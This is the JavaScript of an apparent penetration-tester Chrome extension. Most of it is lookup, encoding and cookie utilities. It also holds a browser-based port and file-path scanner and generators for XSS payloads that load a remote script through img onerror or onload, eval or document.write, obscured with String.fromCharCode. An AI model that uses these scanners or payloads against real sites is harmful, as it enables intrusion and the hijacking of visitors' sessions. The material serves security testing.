$(document).ready(function(){
  //ip查询功能代码
  $("#ipselect").click(function(){
    var ip = $("#ip").val();
    var json = "json";
    $.get("http://int.dpool.sina.com.cn/iplookup/iplookup.php",{format:json,ip:ip},function(data){
      try{
        // 通过JSON.parse解析json对象并且赋值
        var ipinfo = JSON.parse(data);
        //alert(country);
        $(".currentip").html(ip);
        $(".country").html(ipinfo.country);
        $(".region").html(ipinfo.province);
        $(".city").html(ipinfo.city);
        $(".isp").html(ipinfo.isp);
      }
      catch(err){
        alert("查询失败!");
      }
    })
  })
  //whois查询功能代码
  $("#whois").click(function(){
    var json = "json";
    var appkey = "10003";
    var sign = "b59bc3ef6191eb9f747dd4e83c99f2a4";
    var app = "domain.whois";
    var domain = $("#domain").val();
    $.get("http://api.k780.com:88/index.php",{app:app,domain:domain,appkey:appkey,sign:sign,format:json},function(data){
        try{
          var domaininfo = JSON.parse(data);
          $(".adminname").html(domaininfo.result.registrar);
          $(".adminemail").html(domaininfo.result.contact_email);
          $(".sponsoring").html(domaininfo.result.sponsoring_registrar);
          $(".insdate").html(domaininfo.result.dom_insdate);
          $(".upddate").html(domaininfo.result.dom_upddate);
          $(".expdate").html(domaininfo.result.dom_expdate);
        }
        catch(err){
          alert("查询失败!");
        }
    })
  })
  //手机号码查询功能代码 /* 2014.3.10*/
    $("#phoneselect").click(function(){
    var json = "json";
    var app = "phone.get";
    var appkey = "10003";
    var sign = "b59bc3ef6191eb9f747dd4e83c99f2a4";
    var phone = $("#telphone").val();
    $.get("http://api.k780.com:88/index.php",{app:app,phone:phone,appkey:appkey,sign:sign,format:json},function(data){
        try{
          var phoneinfo = JSON.parse(data);
          $(".area").html(phoneinfo.result.area);
          $(".postno").html(phoneinfo.result.postno);
          $(".ctype").html(phoneinfo.result.ctype);
          $(".operators").html(phoneinfo.result.operators);
          $(".style_citynm").html(phoneinfo.result.style_citynm);
        }
        catch(err){
          alert(phoneinfo.msg);
        }
    })
  })
  //短地址转换功能代码
  $("#shorturlclick").click(function(){
    var long = $("#long-url").val(); //获取长链接 
    var short = $("#short-url");  //声明一个变量通过下面的append插入值
    var getobj = "https://api.weibo.com/2/short_url/shorten.json"; 
    var app_key = "211160679";//app_key无效可能会导致无反应； 
    var geturl = getobj + "?source=" + app_key + "&url_long=" + long; 
    var message=""; 
    $.ajax({ 
    url: geturl, 
    type: "GET", 
    dataType: "jsonp", //使用JSONP方法进行AJAX,防止不能跨域.同时需要在Manifest.json声明csp权限 
    cache: false, 
    success: function (data, status) { 
    //获取回传的信息； 
    for(x in data.data.urls[0]) message += x+'='+data.data.urls[0][x]+'&'; 
    short.append( data.data.urls[0].url_short + "<br>"); 
    }, 
    error: function(obj,info,errObj){ 
    alert("$.ajax()中发生错误：" + info); 
    } 
    }); 
  })
  $("#shorturlclear").click(function(){
      $("#long-url").val("");
      $("#short-url").val("");
  })
  //旁站查询功能代码
  $("#select-other-site").click(function(){
    var site = $("#site").val();
    var json = "json";
    $.get("http://domains.yougetsignal.com/domains.php",{remoteAddress:site},function(data){
      try{
        var siteinfo = JSON.parse(data);
        $(".count").html("共计"+siteinfo.domainCount+"个站点,站点ip为:"+siteinfo.remoteIpAddress);
        var info = siteinfo.domainArray.join(); //将查询数组转换为字符串
        var str = info.replace(/\,/g,"\r"); //替换逗号为换行符
        $("#other-result").html(str);//输出结果
      }
      catch(err){
        alert("查询失败!");
      }
    })
  })
  $("#clearsite").click(function(){
    $("#site").val("");
    $("#other-result").val("");
  })

  $("#scan").click(function(){
    scan(this.form);
  })
  $("#clears").click(function(){
    $("#result").val("");
  })
  $("#cleared").click(function(){
    $("#results").val("");
  })
  $("#loads").click(function(){
  var i = new Array(80,8080,3128,8081,9080,1080,21,23,443,27017,28017,27080,8098,7474,9160,5984,9000,69,22,25,110,7001,9090,3389,1521,1158,2100,1433,3306,135,8000);
  document.getElementById("port").value = i;
  })
  $("#loaddir").click(function(){
    
  $(".filedomain").load('dir.txt');
  //延迟一秒读取,以防止加载空内容.
  setTimeout(function(){
    var x = $(".filedomain").html(); //取出加载隐藏的dir.txt
    dir = new Array;
    dir = x.split(',');
        document.getElementById("lujing").value = dir;
      $(".dirbingo").html("加载字典成功:)");
  },1000);
  })

  $("#scandir").click(function(){
    scans(this.form);
  })

//端口扫描功能代码
var AttackAPI = {};
AttackAPI.PortScanner = {};
AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) {
    var timeout = (timeout == null)?100:timeout;
    var img = new Image();
    
    img.onerror = function () {
        if (!img) return;
        img = undefined;
        callback(target, port, '开放');
    };
    img.onload = img.onerror;
    img.src = 'http://' + target + ':' + port;
    
    setTimeout(function () {
        if (!img) return;
        img = undefined;
        callback(target, port, '关闭');
    }, timeout);
};
AttackAPI.PortScanner.scanTarget = function (callback, target, ports, timeout)
{
    for (index = 0; index < ports.length; index++)
        AttackAPI.PortScanner.scanPort(callback, target, ports[index], timeout);
};
var result = document.getElementById('result');
var callback = function (target, port, status) {
    result.value += target + ':' + port + ' ' + status + "\n";
};
var scan = function (form) {
    AttackAPI.PortScanner.scanTarget(callback, form.target.value, form.port.value.split(','), form.timeout.value);
};

//文件扫描功能代码
AttackAPI.FileScanner = {};
AttackAPI.FileScanner.scanFile = function (callbacks, targets, lujing, timeouts) {
    var timeouts = (timeouts == null)?100:timeouts;
    var img = new Image();
    
    img.onerror = function () {
        if (!img) return;
        img = undefined;
        callbacks(targets, lujing, '存在');
    };
    
    img.onload = img.onerror;
    img.src = 'http://' + targets + lujing;
    
    setTimeout(function () {
        if (!img) return;
        img = undefined;
        callbacks(targets, lujing, '不存在');
    }, timeouts);
};
AttackAPI.FileScanner.scanTarget = function (callbacks, targets, lujing, timeouts)
{
    for (index = 0; index < lujing.length; index++)
        AttackAPI.FileScanner.scanFile(callbacks, targets, lujing[index], timeouts);
};
var results = document.getElementById('results');
var callbacks = function (targets, lujing, status) {
    results.value += targets + "/" + lujing + ' ' + status + "\n";
};
var scans = function (form) {
    AttackAPI.FileScanner.scanTarget(callbacks, form.targets.value, form.lujing.value.split(','), form.timeouts.value);
};

//url编码功能代码
$("#coding").click(function(){
  $("#urlcoding").val(escape($("#urlcoding").val()));
})
$("#uncoding").click(function(){
  $("#urlcoding").val(unescape($("#urlcoding").val()));
})
$("#readurl").click(function(){
  window.open($("#urlcoding").val());
})
//htmlurl编码 2014.7.11新增
function htmlurlcoding(a,b){return++b?'%'+(10+a.charCodeAt().toString(16)).slice(-2):unescape(encodeURIComponent(a)).replace(/[^]/g,htmlurlcoding)}
$("#htmlcoding").click(function(){
$("#urlcoding").val(htmlurlcoding($("#urlcoding").val()));
})
//清除
$("#clearurl").click(function(){
  $("#urlcoding").val("");
})

//js转义功能代码
//转unicode
var decToHex = function(str) {
    var res=[];
    for(var i=0;i < str.length;i++)
        res[i]=("00"+str.charCodeAt(i).toString(16));
    return "\\u"+res.join("\\u");
}
var hexToDec = function(str) {
    str=str.replace(/\\/g,"%");
    return unescape(str);
}
//转base16
var base16ToHex = function(str) {
    var res=[];
    for(var i=0;i < str.length;i++)
        res[i]=(str.charCodeAt(i).toString(16));
    return "\\x"+res.join("\\x");
}
var hexToBase16 = function(str) {
    str=str.replace(/\\x/g,"%");
    return unescape(str);
}

$("#unicode").click(function(){
  $("#jsescape").val(decToHex($("#jsescape").val()));
})
$("#unsicode").click(function(){
  $("#jsescape").val(hexToDec($("#jsescape").val()));
})
$("#base16").click(function(){
  $("#jsescape").val(base16ToHex($("#jsescape").val()));
})
$("#unbase16").click(function(){
  $("#jsescape").val(hexToBase16($("#jsescape").val()));
})
$("#clearjsescape").click(function(){
  $("#jsescape").val("");
})
//html转义功能代码
var htmlToHex = function(str) {
    var res=[];
    for(var i=0;i < str.length;i++)
        res[i]=("&#"+str.charCodeAt(i));
    return res.join(";");
}
var hexToHtml = function(str) {
        var str ="";
        var strs= $("#htmlescape").val().split("&#");
        for(var i=1;i<strs.length;i++)
        {
          str+=String.fromCharCode(parseInt(strs[i].replace(';','')));
        }
        return str;
        }
var htmlsToHex = function(str) {
    var res=[];
    for(var i=0;i < str.length;i++)
        res[i]=("&#x"+"00"+str.charCodeAt(i).toString(16));
    return res.join(";");
}
var hexToHtmls = function(str) {
        var str ="";
        var strs= $("#htmlescape").val().split("&#x");
        for(var i=1;i<strs.length;i++)
        {
          str+=String.fromCharCode(parseInt(strs[i],16));
        }
        return str;
        }
$("#htmlcode10").click(function(){
  $("#htmlescape").val(htmlToHex($("#htmlescape").val()));
})
$("#unhtmlcode10").click(function(){
  $("#htmlescape").val(hexToHtml($("#htmlescape").val()));
})
$("#htmlcode16").click(function(){
  $("#htmlescape").val(htmlsToHex($("#htmlescape").val()));
})
$("#unhtmlcode16").click(function(){
  $("#htmlescape").val(hexToHtmls($("#htmlescape").val()));
})
$("#clearhtmlescape").click(function(){
  $("#htmlescape").val("");
})
//调用外部js代码生成部分代码
$("#script").click(function(){
  $("#jsaddress").val("双引号版本:"+
    "<script/src="+'"'+$("#jsaddress").val()+'"'+"><\/script>"+"\r\n"
    +"单引号版本:"+"<script/src="+'"'+$("#jsaddress").val()+'"'+"><\/script>"+"\r\n"
    +"无引号版本:"+"<script/src="+$("#jsaddress").val()+"><\/script>"+"\r\n"
    );

})
//swf调用外部js代码
$("#swf").click(function(){
  $("#jsaddress").val("<embed src="+$("#jsaddress").val()+" "+"allowscriptaccess=always type=application/x-shockwave-flash><\/embed>");
})
$("#clearjsaddress").click(function(){
  $("#jsaddress").val("");
})
//公用返回stringfromcharcode函数
var returnStringfromCharCode = function(str) {
    var res=[];
    for(var i=0;i < str.length;i++)
        res[i]=(str.charCodeAt(i));
    return res.join(",");
}
$("#Jquery").click(function(str){
  $("#jsaddress").val('双引号版本:\r\n'+"jQuery.getScript("+'"'+$("#jsaddress").val()+'")\r\n'+"无引号版本:\r\n"+"jQuery.getScript(String.fromCharCode("+returnStringfromCharCode($("#jsaddress").val())+"))");
})
$("#onerror").click(function(str){
  $("#jsaddress").val('带引号版本:\r\n'+'<img/src="1"onerror="window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode('+returnStringfromCharCode($("#jsaddress").val())+');document.body.appendChild(window.s)">'+
    '\r\n无引号版本:\r\n'+'<img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode('+returnStringfromCharCode($("#jsaddress").val())+');document.body.appendChild(window.s)})()>')
})
$("#onload").click(function(str){
  $("#jsaddress").val('带引号版本:\r\n'+'<img/src="http://www.baidu.com/img/baidu_sylogo1.gif"onload="window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode('+returnStringfromCharCode($("#jsaddress").val())+');document.body.appendChild(window.s)">\r\n'+
    '无引号版本:\r\n'+'<img/src=http://www.baidu.com/img/baidu_sylogo1.gif onload=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode('+returnStringfromCharCode($("#jsaddress").val())+');document.body.appendChild(window.s)})()>');
})
$("#eval").click(function(str){
  $("#jsaddress").val("eval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode("+returnStringfromCharCode($("#jsaddress").val())+");document.body.appendChild(window.s)')")
})
$("#documentwrite").click(function(str){
  $("#jsaddress").val('双引号版本:\r\n'+'document.write("<script src=\\"'+$("#jsaddress").val()+'\\"><\\/script>");\r\n'+'单引号版本:\r\n'+"document.write('<script src=\\'"+$("#jsaddress").val()+"\\'><\\/script>');\r\n无引号版本\r\n"+"document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,"+returnStringfromCharCode($("#jsaddress").val())+",39,62,60,92,47,115,99,114,105,112,116,62));");
})
$("#appendChild").click(function(str){
  $("#jsaddress").val('普通版本:\r\n'+"var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode("+returnStringfromCharCode($("#jsaddress").val())+");document.body.appendChild(s)\r\n"+'无空格版:\r\n'+'window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode('+returnStringfromCharCode($("#jsaddress").val())+");document.body.appendChild(window.s)")
})

//String.fromCharCode()转换
$("#transformation").click(function(){
  $("#stringfromcharcode").val("String.fromCharCode("+returnStringfromCharCode($("#stringfromcharcode").val())+") ");
})
$("#clearstring").click(function(){
  $("#stringfromcharcode").val("");
})
//文本批量替换代码
$("#replace").click(function(){
  var textcontent = $("#replace-text").val();
  var replacecontent = $("#replace-content").val();
  var qcontent = $("#q-content").val();
  var replacecontents = new RegExp(replacecontent,'g');
  var str = textcontent.replace(replacecontents,qcontent);
  $("#replace-result").val(str);
})
$("#clearreplace").click(function(){
  $("#replace-text").val("");
  $("#replace-content").val("");
  $("#q-content").val("");
  $("#replace-result").val("");
})
//清除所有信息代码
var callbackclear = function () {
  alert("清除成功了{T_T},赶紧看看有木有感觉快一点儿呢?!");
}
$(".clearall").click(function(){
  if(confirm('确认清除所有记录吗?')){
    try{
        chrome.browsingData.remove({
          "since": 0,
          "originTypes":{
              "protectedWeb": true
          }
        }, {
          "appcache": true,
          "cache": true,
          "cookies": true,
          "downloads": true,
          "fileSystems": true,
          "formData": true,
          "history": true,
          "indexedDB": true,
          "localStorage": true,
          "pluginData": true,
          "passwords": true,
          "webSQL": true
        }, callbackclear);    
      }catch(err){
        alert("清除失败!!");
      }

}
})
//添加cookie部分代码
  $("#addcookie").click(function(){
    var httpOnlys = $("input[name='httponly']:checked").val();
    if (httpOnlys == 1) {
      http_Only = true;
    }else{
      http_Only = false;
    }
    chrome.cookies.set({
      'url':$("#addurl").val(),
      'name':$("#addcookiename").val(),
      'value':$("#addcookievalue").val(),
      'secure':false,
      'httpOnly':http_Only
  }, function(cookie){
      $(".addcookiebingo").html("添加成功:)")
    });
  })
//删除指定cookie部分代码
  $("#delcookie").click(function(){
    chrome.cookies.remove({
      'url':$("#delurl").val(),
      'name':$("#delcookiename").val()
  }, function(cookie){
    if($("#delurl").val()==""||$("#delcookiename").val()==""){
      $(".delcookiebingo").html('域名和cookie不能为空');
    }else{
      $(".delcookiebingo").html("删除成功:)")
    }
    });
  })
//清除历史记录代码
  $(".clearhistory").click(function(){
    if(confirm('确认清除历史记录吗?')){
        chrome.history.deleteAll(function(){
            alert('清除历史记录成功!');
        });
    }
  })
  $(".website").click(function(){
    chrome.tabs.create(
    {url:"http://wutongyu.info"}
    )
  })
  $(".wooyun").click(function(){
    chrome.tabs.create(
    {url:"http://wooyun.org/whitehats/梧桐雨"}
    )
  })
  $(".zhihu").click(function(){
    chrome.tabs.create(
    {url:"http://www.zhihu.com/people/yuwutongyu"}
    )
  })
//2014.3.8新增
  $("#getsetcookie").click(function(){
    chrome.cookies.getAll({}, function(cookies){
      for(var i = 0;i<=cookies.length;i++){
        var j = cookies[i];
        $(".getsetcookiedomain").append("<option value="+i+">"+j.domain+"</option>");
        $(".getsetcookiename").append("<option value="+i+">"+j.name+"</option>");
        $(".getsetcookiehttponly").append("<option value="+i+">"+j.httpOnly+"</option>");
        $(".getsetcookievalue").append("<option value="+i+">"+j.value+"</option>");
        //console.log(cookies[i]);
      }
      
    });
  })
  $(".getsetcookiedomain").change(function(){
    var setcookiedomain = $(".getsetcookiedomain").val(); //获取改变之后的option value
    var setcookiedomains = parseInt(setcookiedomain); //将选中的index值取出来,转为number
    var setcookietext = $(".getsetcookiedomain option[value="+setcookiedomains+"]").text(); //取选中的网址
    
    //通过选中的网址搜对应的cookie name
    chrome.cookies.getAll({}, function(cookies){
      for(var i = 0;i<=cookies.length;i++){
            var j = cookies[setcookiedomain];
            $(".getsetcookiename").empty(); //清除之前的cookie文本
            $(".getsetcookiehttponly").empty(); 
            $(".getsetcookievalue").empty(); 
            $("<option value="+i+">"+j.name+"</option>").appendTo(".getsetcookiename"); //插入获取到的cookie对应的name
            $("<option value="+i+">"+j.httpOnly+"</option>").appendTo(".getsetcookiehttponly");
            $("<option value="+i+">"+j.value+"</option>").appendTo(".getsetcookievalue");
      }
		
    })
    
  })

})
//时钟
function changeClock()
{
  var d = new Date();
  document.getElementById("clock").innerHTML = d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();
}
window.setInterval(changeClock, 1000);


